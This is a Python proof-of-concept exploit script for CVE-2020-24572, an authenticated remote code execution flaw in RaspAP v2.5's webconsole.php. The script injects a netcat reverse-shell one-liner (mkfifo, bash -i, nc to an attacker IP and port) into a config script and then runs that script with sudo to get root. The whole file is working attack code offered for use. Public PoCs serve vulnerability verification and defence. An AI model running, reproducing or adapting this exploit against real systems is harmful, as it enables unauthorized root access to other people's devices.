#/usr/bin/python3

#####################################################
###      Proof of Concept for CVE-2020-24572      ###
###     (Authenticated) Remote Code Execution     ###
###             via Webconsole.php in             ###
###                  RaspAP v2.5                  ###
###         github.com/billz/raspap-webgui        ###
###         github.com/nickola/web-console        ###
#####################################################
### Written by: lunchb0x - Disc. Date: 08/24/2020 ###
#####################################################
###         github.com/lb0x/CVE-2020-24572        ###
#####################################################

import os
import sys
import requests
from termcolor import colored

if len(sys.argv) != 6:
    print("---------------------------------------------------------------------------------------")
    print("USAGE: rasp_pwn.py [target_ip] [port] [attacker_ip] [attacker_port] [RaspAP_admin_pass]")
    print("---------------------------------------------------------------------------------------")
    exit(1)

target = sys.argv[1]
port = sys.argv[2]
listener_ip = sys.argv[3]
listener_port = sys.argv[4]
raspap_user = "admin"
raspap_pass = sys.argv[5]

session = requests.Session()
session.auth = (raspap_user, raspap_pass)


json_req_1 = {
              "jsonrpc":"2.0",
              "method":"run",
              "params":["NO_LOGIN",
                        {"user":"","hostname":"","path":""},
                        "echo 'touch \/tmp\/f;rm \/tmp\/f;mkfifo \/tmp\/f;cat \/tmp\/f|\/bin\/bash -i 2>&1|nc %s %d >\/tmp\/f' >> \/etc\/raspap\/lighttpd\/configport.sh"%(listener_ip, listener_port)
                        ],
              "id":6
              }

json_req_2 = {
              "jsonrpc":"2.0",
              "method":"run",
              "params":["NO_LOGIN",
                        {"user":"","hostname":"","path":""},
                        "sudo /etc/raspap/lighttpd/configport.sh"
                        ],
              "id":6
              }

r = session.post("http://%s:%s/includes/webconsole.php"%(target,port), json=json_req_1)
print(colored("[!]", 'green') + " Reverse shell injected")
print(colored("[!]", 'yellow') + " Sending activation request - Make sure your listener is running . . .")
os.system("stty -echo")
input(colored("[>>>]", 'green')+" Press ENTER to continue . . .")
os.system("stty echo")
print(colored("\n[!]", 'green') + " You should be root :)")

r = session.post("http://%s:%s/includes/webconsole.php"%(target,port), json=json_req_2)
print(colored("[*]", 'green') + " Done.")
